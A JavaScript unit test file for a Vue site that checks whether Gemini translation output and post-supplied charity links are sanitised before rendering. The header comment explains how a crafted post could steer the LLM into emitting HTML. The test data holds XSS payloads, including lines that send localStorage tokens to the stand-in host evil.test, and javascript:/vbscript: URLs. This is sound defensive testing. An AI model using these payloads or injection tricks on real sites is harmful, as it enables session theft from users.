/**
 * The LLM translation path must not be able to inject HTML into the page.
 *
 * WHY THIS EXISTS: $cleanBody was applied to the text SENT to Gemini and not to the text
 * that came BACK. The result is rendered by <SafeRemarkable :options="{html:true}">,
 * which - despite the name - does no sanitising at all; it wraps vue-remarkable, which
 * assigns innerHTML. So the model's output reached the DOM as raw HTML.
 *
 * That is reachable, not theoretical: components/gemini-client.js instructs the model to
 * PRESERVE HTML and wraps the post body in """ delimiters that the post's author can
 * close, so a crafted Hive post can steer the model into emitting markup. Any reader who
 * clicks "Translate" would execute it on actifit.io - where actiToken, access_token and
 * the HiveAuth session key all live in localStorage.
 *
 * These tests assert on the SANITISER'S BEHAVIOUR against the real payloads, because the
 * call sites now route through it. A source-text assertion ("the file contains
 * $cleanBody") would pass against a call site that sanitised the wrong variable.
 */
// hive-auth-wrapper opens a transport on import; stub it, as vue-custom.spec.js does.
jest.mock('hive-auth-wrapper', () => ({ broadcast: jest.fn(), authenticate: jest.fn() }))

import Vue from 'vue'
import '@/plugins/vue-custom'
import sanitizePlugin from '@/plugins/sanitize'

// DOMPurify branch - what the user actually gets after hydration.
process.client = true

// $cleanBody is installed on Vue.prototype by the plugin.
const cleanBody = (html) => Vue.prototype.$cleanBody.call({}, html)

const PAYLOADS = [
  ['img onerror beacon', `<img src=x onerror="fetch('https://evil.test/?t='+localStorage.actiToken)">`],
  ['script tag', '<script>fetch("https://evil.test/?t="+localStorage.access_token)<\/script>'],
  ['svg onload', '<svg onload=alert(1)>'],
  ['mixed-case script', '<ScRiPt>alert(1)<\/ScRiPt>'],
  ['body onload', '<body onload=alert(1)>'],
  ['details ontoggle', '<details open ontoggle=alert(1)>'],
  ['iframe to attacker', '<iframe src="https://evil.test/"><\/iframe>'],
  ['javascript: anchor', '<a href="javascript:alert(1)">x</a>'],
  ['entity-encoded javascript:', '<a href="&#106;avascript:alert(1)">x</a>'],
]

describe('Gemini translation output is sanitised before render', () => {
  it.each(PAYLOADS)('neutralises %s', (_label, payload) => {
    const out = String(cleanBody(payload))

    // No event handlers, no script elements, no javascript: URLs survive.
    expect(out).not.toMatch(/\son[a-z]+\s*=/i)
    expect(out).not.toMatch(/<script/i)
    expect(out).not.toMatch(/javascript:/i)
    expect(out).not.toContain('evil.test/?t=')
  })

  it('does not simply return empty for everything', () => {
    // Guards against a "sanitiser" that passes the tests above by destroying all input,
    // which would silently break the translate feature instead of securing it.
    const out = String(cleanBody('Hello **world**, visit https://actifit.io'))
    expect(out).toMatch(/Hello/)
    expect(out.length).toBeGreaterThan(5)
  })

  it('keeps the exfiltration string out even when wrapped in benign text', () => {
    const out = String(cleanBody('Translated text. <img src=x onerror="fetch(\'//evil.test/\'+localStorage.access_token)"> More text.'))
    expect(out).toContain('Translated text.')
    expect(out).not.toMatch(/onerror/i)
  })
})

describe('$safeUrl neutralises attacker-controlled hrefs', () => {
  // The charity link is read straight from a post's on-chain json_metadata, which the
  // post author fully controls. Vue does not sanitise :href, so a javascript: URL there
  // is a one-click XSS on our origin.
  let $safeUrl
  beforeAll(() => {
    // Same loader shape as test/unit/plugins/sanitize.spec.js.
    const injected = {}
    sanitizePlugin({ app: {} }, (name, fn) => { injected[name] = fn })
    $safeUrl = injected.safeUrl
  })

  it.each([
    'javascript:alert(1)',
    'JaVaScRiPt:alert(1)',
    'java\tscript:alert(1)',
    ' javascript:alert(1)',
    'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    'vbscript:msgbox(1)',
  ])('refuses %s', (bad) => {
    const out = $safeUrl(bad)
    expect(String(out)).not.toMatch(/javascript:/i)
    expect(String(out)).not.toMatch(/vbscript:/i)
    expect(String(out)).not.toMatch(/^data:text\/html/i)
  })

  it('still allows a legitimate external charity link', () => {
    // Otherwise the fix would quietly break every real charity link on the site.
    expect($safeUrl('https://redcross.org/donate')).toBe('https://redcross.org/donate')
    expect($safeUrl('http://example.org/x')).toBe('http://example.org/x')
  })
})
